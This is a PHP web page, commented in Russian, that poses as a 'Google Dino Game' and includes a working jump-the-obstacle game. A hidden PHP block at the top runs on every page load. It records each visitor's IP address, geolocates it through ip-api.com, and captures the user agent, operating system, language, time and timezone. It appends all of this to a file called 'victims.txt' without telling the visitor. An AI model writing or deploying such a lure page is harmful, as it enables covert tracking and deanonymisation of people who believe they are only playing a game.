<!DOCTYPE html>
<?php
// Функция для получения IP-адреса пользователя
function getUserIP() {
    if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
        return $_SERVER['HTTP_CLIENT_IP'];
    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        return $_SERVER['HTTP_X_FORWARDED_FOR'];
    } else {
        return $_SERVER['REMOTE_ADDR'];
    }
}

// Функция для получения информации о местоположении по IP
function getLocationInfo($ip) {
    $url = "http://ip-api.com/json/{$ip}";
    $response = file_get_contents($url);
    return json_decode($response, true);
}

// Функция для получения User-Agent
function getUserAgent() {
    return $_SERVER['HTTP_USER_AGENT'];
}

// Функция для получения языка системы
function getLanguage() {
    return substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
}

// Функция для получения времени и часового пояса
function getTimeAndTimezone() {
    $timezone = date_default_timezone_get();
    $time = date('Y-m-d H:i:s');
    return [
        'time' => $time,
        'timezone' => $timezone
    ];
}

// Функция для определения операционной системы
function getOS() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/windows/i', $userAgent)) {
        return 'Windows';
    } elseif (preg_match('/macintosh|mac os x/i', $userAgent)) {
        return 'MacOS';
    } elseif (preg_match('/linux/i', $userAgent)) {
        return 'Linux';
    } elseif (preg_match('/android/i', $userAgent)) {
        return 'Android';
    } elseif (preg_match('/iphone|ipad|ipod/i', $userAgent)) {
        return 'iOS';
    } else {
        return 'Неизвестно';
    }
}

// Получаем данные
$ip = getUserIP();
$locationInfo = getLocationInfo($ip);
$userAgent = getUserAgent();
$os = getOS();
$language = getLanguage();
$timeInfo = getTimeAndTimezone();

// Формируем данные для сохранения
$data = "IP: {$ip}\n";
$data .= "Страна: {$locationInfo['country']}\n";
$data .= "Город: {$locationInfo['city']}\n";
$data .= "User-Agent: {$userAgent}\n";
$data .= "Операционная система: {$os}\n";
$data .= "Время: {$timeInfo['time']}\n";
$data .= "Часовой пояс: {$timeInfo['timezone']}\n";
$data .= "Язык системы: {$language}\n";
$data .= "--------------------------\n";

// Сохраняем данные в файл
file_put_contents('victims.txt', $data, FILE_APPEND);
?>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Dino Game</title>
    <style>
        body {
            margin: 0;
            overflow: hidden;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f7f7f7;
            font-family: Arial, sans-serif;
        }
        #game {
            position: relative;
            width: 600px;
            height: 200px;
            border: 2px solid #333;
            background-color: #fff;
            overflow: hidden;
        }
        #dino {
            position: absolute;
            bottom: 0;
            left: 50px;
            width: 40px;
            height: 40px;
            background-color: #333;
        }
        #obstacle {
            position: absolute;
            bottom: 0;
            right: 0;
            width: 20px;
            height: 40px;
            background-color: #555;
            animation: moveObstacle 2s linear infinite;
        }
        @keyframes moveObstacle {
            from {
                right: 0;
            }
            to {
                right: 600px;
            }
        }
        .jump {
            animation: jump 0.5s linear;
        }
        @keyframes jump {
            0% {
                bottom: 0;
            }
            50% {
                bottom: 60px;
            }
            100% {
                bottom: 0;
            }
        }
        #score {
            position: absolute;
            top: 10px;
            right: 10px;
            font-size: 20px;
            color: #333;
        }
    </style>
</head>
<body>
    <div id="game">
        <div id="dino"></div>
        <div id="obstacle"></div>
        <div id="score">Счет: 0</div>
    </div>

    <script>
        const dino = document.getElementById("dino");
        const obstacle = document.getElementById("obstacle");
        const scoreDisplay = document.getElementById("score");
        let score = 0;
        let isJumping = false;

        // Прыжок динозавра
        document.addEventListener("keydown", function (event) {
            if (event.code === "Space" && !isJumping) {
                jump();
            }
        });

        function jump() {
            isJumping = true;
            dino.classList.add("jump");
            setTimeout(() => {
                dino.classList.remove("jump");
                isJumping = false;
            }, 500);
        }

        // Проверка столкновений
        const checkCollision = setInterval(() => {
            const dinoBottom = parseInt(window.getComputedStyle(dino).getPropertyValue("bottom"));
            const obstacleRight = parseInt(window.getComputedStyle(obstacle).getPropertyValue("right"));

            if (obstacleRight > 50 && obstacleRight < 90 && dinoBottom <= 40) {
                alert("Игра окончена! Ваш счет: " + score);
                score = 0;
                scoreDisplay.textContent = "Счет: 0";
            } else {
                score++;
                scoreDisplay.textContent = "Счет: " + score;
            }
        }, 10);
    </script>
</body>
</html>